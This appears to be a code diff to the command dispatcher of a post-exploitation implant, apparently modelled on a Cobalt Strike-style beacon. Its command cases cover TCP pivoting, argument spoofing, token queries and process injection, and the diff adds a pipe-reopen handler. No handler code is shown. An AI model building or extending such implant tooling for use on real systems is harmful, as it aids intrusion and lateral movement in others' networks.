@@ -42,7 +42,6 @@ void TaskDispatch(int cmd, char* buffer, int size)
 		case COMMAND_LSOCKET_TCPPIVOT:
 			ChannelLSocketTcpPivot(buffer, size);
 			break;
-
 		case COMMAND_ARGUE_ADD:
 			ArgumentAdd(buffer, size);
 			break;
@@ -52,7 +51,6 @@ void TaskDispatch(int cmd, char* buffer, int size)
 		case COMMAND_ARGUE_LIST:
 			ArgumentList();
 			break;
-
 		case COMMAND_TCP_CONNECT:
 			LinkViaTcp(buffer, size);
 			break;
@@ -136,6 +134,9 @@ void TaskDispatch(int cmd, char* buffer, int size)
 			break;
 		case COMMAND_TOKEN_GETUID:
 			IdentityGetUid();
+			break;
+		case COMMAND_PIPE_REOPEN:
+			PipeReopen(buffer, size);
 			break;
 		case COMMAND_INJECT_PING:
 			SpawnAndPing(buffer, size, TRUE);
